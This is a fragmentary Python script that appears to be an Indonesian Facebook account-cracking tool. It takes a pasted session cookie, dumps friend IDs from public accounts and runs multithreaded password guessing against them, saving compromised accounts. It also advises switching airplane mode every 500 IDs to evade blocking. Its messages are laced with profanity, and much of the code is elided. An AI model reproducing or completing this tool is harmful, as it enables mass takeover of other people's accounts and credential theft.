...
def banner():
	clear()
	sol()
	ban='''  ©Crack Facebook Akun By MRrayan
                                  🄼🅁🅁🄰🅈🄰🄽
                                  🄿🅁🄴🄼🄸🅄🄼              ➣ Author :MRrayan
                                                                            ➣ Wa :+19724188800
                                                                            ➣  Status :Premium
...
def login():
	try:
		...
		try:
			...
			li = ' JARINGAN LOO KAYA KNTOL NGELAG BANGAT '
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tLogin Menggunakan : [green]Cookies Fb[white]'))
		asu = random.choice([h])
		cookie=input(f'Masukan Cookies :{KONTOL} ')
		...
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK AKUN LOO SONO!!!!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	...
	if _____renv__renv_____ in ['1']:
		...
		print('➣ Masukin Yg Bener Ngentd ')
		back()
def error():
	print(f'{k}➣ Fitur Ini Sedang Dalam Perbaikan Ya Titid {x}')
	time.sleep(4)
	back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	...
	try:
		...
		print('➣ Masukin Yg Bener Ngntd ')
		exit()
	if jum<1 or jum>100:
		print('➣ Gagal Akun Bersifat Tidak Public Masukin Biar Bener Tolol')
		exit()
	ses=requests.Session()
	yz = 0
	...
	try:
		...
		print(f'>>{k} Teman Bukan Publik {x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'\n{x}➣pilih mau yang mana ')
	print('')
	print(f'{x}1. Akun Old  ({M}Not Recommend{M}{x}){x} ')
	print(f'2. Akun New  ({H}Recommended{H}{x}){x}  ')
	print(f'3. Akun Random ({K}Very Recommended{K}{x}){x} ')
	print('')
	hu = input('Select : ')
	if hu in ['1','01']:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Sabar Ngntod Coli Dulu Aja {m}•{k}•{h}•{x} <<<<< ')
	print('')
	print(f'>> Results {h}OK{x} Save in : {h}OK/%s {x}'%(okc))
	print(f'>> Results {k}CP{x} Save in : {k}CP/%s {x}'%(cpc))
	print(f'>> Nyalakan Mode Pesawat Setiap 500 ID\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak('\t[cyan]>>[green] Succesfully Crack,Jangan Ngeluh Terus Ya Kntol [cyan] <<[white] ')
	print('')
	print(f'{h} OK : {h}%s '%(ok))
	print(f'{k} CP : {k}%s{x} '%(cp))
	print('')
	print(f'\t{x}>>{k} Good Bye Thanks To Using My Script MRrayan {x} << ')
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
